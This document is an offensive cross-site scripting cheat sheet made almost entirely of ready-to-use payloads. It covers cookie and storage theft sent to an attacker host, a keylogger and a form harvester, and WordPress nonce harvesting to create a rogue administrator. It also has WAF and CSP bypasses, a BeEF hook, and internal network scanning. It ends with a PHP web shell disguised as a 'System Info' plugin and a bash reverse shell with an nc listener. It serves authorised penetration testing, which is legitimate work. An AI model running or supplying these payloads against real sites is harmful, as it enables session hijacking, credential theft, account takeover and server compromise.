# Cross-Site Scripting (XSS)

Cross-Site Scripting (XSS) vulnerabilities allow attackers to inject malicious scripts into web applications. When exploited, XSS can lead to account takeover, privilege escalation, session hijacking, and internal network compromise.

---

## XSS Types

| Type | Description | Persistence |
|------|-------------|-------------|
| **Reflected** | Payload in URL/request, reflected in response | Non-persistent |
| **Stored** | Payload saved server-side, executes on page load | Persistent |
| **DOM-based** | Payload manipulates client-side DOM directly | Non-persistent |

---

## Detection Payloads

### Basic Detection

```javascript
<script>alert(42)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
<input onfocus=alert(1) autofocus>
<body onpageshow=alert(1)>
```

### Advanced Detection

```javascript
<script>confirm('XSS')</script>
<script>prompt('XSS')</script>
<script>console.log('XSS')</script>
```

> Use unique identifiers (like `42`) to confirm execution. Test all input fields, headers, and URL parameters.

---

## Session Hijacking & Data Exfiltration

### Basic Cookie Theft

```javascript
<script>document.location='http://ATTACKER_IP/steal.php?c='+document.cookie</script>
<script>new Image().src='http://ATTACKER_IP/steal.php?c='+document.cookie</script>
```

### Advanced Session Data Theft

```javascript
fetch('http://ATTACKER_IP/steal', {
  method: 'POST',
  body: JSON.stringify({
    cookies: document.cookie,
    localStorage: JSON.stringify(localStorage),
    sessionStorage: JSON.stringify(sessionStorage),
    url: window.location.href
  })
});
```

> Check for `HttpOnly` flag on cookies. If cookies are protected, focus on CSRF-style attacks instead.

---

## Keylogging & Credential Harvesting

### Basic Keylogger

```javascript
document.addEventListener('keypress', function(e) {
  fetch('http://ATTACKER_IP/keys', {
    method: 'POST',
    body: 'key=' + e.key + '&url=' + window.location.href
  });
});
```

### Form Data Harvesting

```javascript
document.addEventListener('submit', function(e) {
  let formData = new FormData(e.target);
  let data = {};
  for (let [key, value] of formData.entries()) {
    data[key] = value;
  }
  fetch('http://ATTACKER_IP/harvest', {
    method: 'POST',
    body: JSON.stringify(data)
  });
});
```

---

## Privilege Escalation via Stored XSS

When stored XSS runs in an admin context, it can be used for privilege escalation even when cookies are `HttpOnly` and `Secure`. The technique relies on nonce/CSRF token harvesting and same-origin form submissions.

### Nonce Harvest + Admin Account Creation

```javascript
// Step 1: Fetch admin page to obtain CSRF/nonce token
var ajaxRequest = new XMLHttpRequest();
var requestURL = "/admin/user-new.php";
var nonceRegex = /ser" value="([^"]*?)"/g;
ajaxRequest.open("GET", requestURL, false);
ajaxRequest.send();
var nonceMatch = nonceRegex.exec(ajaxRequest.responseText);
var nonce = nonceMatch[1];

// Step 2: Create admin user with harvested nonce
var params = "action=createuser&_wpnonce_create-user="+nonce
  +"&user_login=attacker&email=attacker@target.com"
  +"&pass1=attackerpass&pass2=attackerpass&role=administrator";
ajaxRequest = new XMLHttpRequest();
ajaxRequest.open("POST", requestURL, true);
ajaxRequest.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
ajaxRequest.send(params);
```

### Async/Await Version

```javascript
(async () => {
  try {
    const resp = await fetch('/admin/user-new.php', { credentials: 'include' });
    const html = await resp.text();

    const m1 = html.match(/name="_wpnonce_create-user"\s+value="([^"]+)"/);
    const m2 = html.match(/name="_wpnonce"\s+value="([^"]+)"/);
    const nonce = (m1 && m1[1]) || (m2 && m2[1]);
    if (!nonce) return;

    const fd = new FormData();
    fd.append('_wpnonce_create-user', nonce);
    fd.append('action', 'createuser');
    fd.append('user_login', 'attacker');
    fd.append('email', 'attacker@target.com');
    fd.append('pass1', 'attackerpass');
    fd.append('pass2', 'attackerpass');
    fd.append('role', 'administrator');

    await fetch('/admin/user-new.php', {
      method: 'POST', body: fd, credentials: 'include'
    });
  } catch (e) {}
})();
```

---

## Generic CSRF Token Bypass

```javascript
function getCSRF() {
  let token = document.querySelector('input[name*="token"]')?.value ||
              document.querySelector('meta[name*="csrf"]')?.content ||
              document.querySelector('input[name*="csrf"]')?.value;
  return token;
}
```

### Framework-Specific CSRF Bypass (Laravel Example)

```javascript
let token = document.querySelector('meta[name="csrf-token"]').getAttribute('content');
fetch('/admin/users', {
  method: 'POST',
  headers: {
    'X-CSRF-TOKEN': token,
    'Content-Type': 'application/json'
  },
  body: JSON.stringify({username: 'attacker', role: 'admin'})
});
```

---

## WAF Bypass Techniques

### Case Variation

```html
<ScRiPt>alert(1)</ScRiPt>
<SCRIPT>alert(1)</SCRIPT>
```

### HTML Encoding

```html
&#60;script&#62;alert(1)&#60;/script&#62;
&lt;script&gt;alert(1)&lt;/script&gt;
```

### Alternative Event Handlers

```html
<img src=x onerror=eval(atob('YWxlcnQoMSk='))>
<svg onload=Function('alert(1)')()>
<input onfocus=alert(1) autofocus>
<body onpageshow=alert(1)>
```

### Base64 Encoding

```
atob('YWxlcnQoMSk=') decodes to alert(1)
```

---

## Payload Encoding & Delivery

### CharCode Encoding Function

```javascript
function encode_to_javascript(string) {
  var output = '';
  for (pos = 0; pos < string.length; pos++) {
    output += string.charCodeAt(pos);
    if (pos != (string.length - 1)) {
      output += ",";
    }
  }
  return output;
}
```

### Execution Methods

```javascript
eval(String.fromCharCode(encoded_payload))
Function(String.fromCharCode(encoded_payload))()
setTimeout(String.fromCharCode(encoded_payload))
```

### Delivery via curl

```bash
curl -H "User-Agent: <script>eval(String.fromCharCode(118,97,114...))</script>" \
  http://TARGET --proxy 127.0.0.1:8080
```

---

## Advanced Payloads

### Browser Exploitation Framework Hook

```html
<script src="http://ATTACKER_IP:3000/hook.js"></script>
```

### Internal Network Scanning

```javascript
for (let i = 1; i < 255; i++) {
  fetch(`http://192.168.1.${i}:80`, {mode: 'no-cors'})
    .then(() => {
      fetch(`http://ATTACKER_IP/found?ip=192.168.1.${i}`);
    });
}
```

### WebSocket Reverse Shell

```javascript
let ws = new WebSocket('ws://ATTACKER_IP:8080');
ws.onopen = function() {
  ws.send(JSON.stringify({
    type: 'shell',
    user: document.cookie,
    url: location.href
  }));
};
```

---

## CSP Bypass Methods

```javascript
// If 'unsafe-inline' allowed
<script>alert(1)</script>

// JSONP bypass
<script src="http://allowed-domain.com/jsonp?callback=alert"></script>

// Base tag injection
<base href="http://ATTACKER_IP/">
```

---

## Web Shell via Admin Access (Post-XSS)

### PHP Web Shell Plugin

```php
<?php
/*
Plugin Name: System Info
Description: System information plugin
Version: 1.0
*/
if(isset($_GET['cmd'])) {
    echo '<pre>' . shell_exec($_GET['cmd']) . '</pre>';
}
?>
```

### Access and Upgrade

```bash
# Access web shell
http://TARGET/wp-content/plugins/system-info/plugin.php?cmd=whoami

# Upgrade to reverse shell
http://TARGET/wp-content/plugins/system-info/plugin.php?cmd=bash%20-c%20%27bash%20-i%20%3E%26%20/dev/tcp/ATTACKER_IP/4444%200%3E%261%27

# Start listener
nc -lvnp 4444
```

---

## Testing Checklist

- [ ] Input fields (forms, search, comments)
- [ ] HTTP headers (User-Agent, Referer, X-Forwarded-For)
- [ ] URL parameters
- [ ] File upload functionality
- [ ] Error messages
- [ ] JSON/XML endpoints

---

## Escalation Path

1. **XSS** -> Admin Account Creation (nonce harvest)
2. **Admin Access** -> File Upload
3. **File Upload** -> Web Shell
4. **Web Shell** -> System Compromise

---

## Tools

| Tool | Use Case |
|------|----------|
| Burp Suite | Intercept, modify, and replay XSS payloads |
| curl | Manual payload injection via headers/POST |
| BeEF | Browser exploitation framework |
| XSStrike | Automated XSS detection and exploitation |
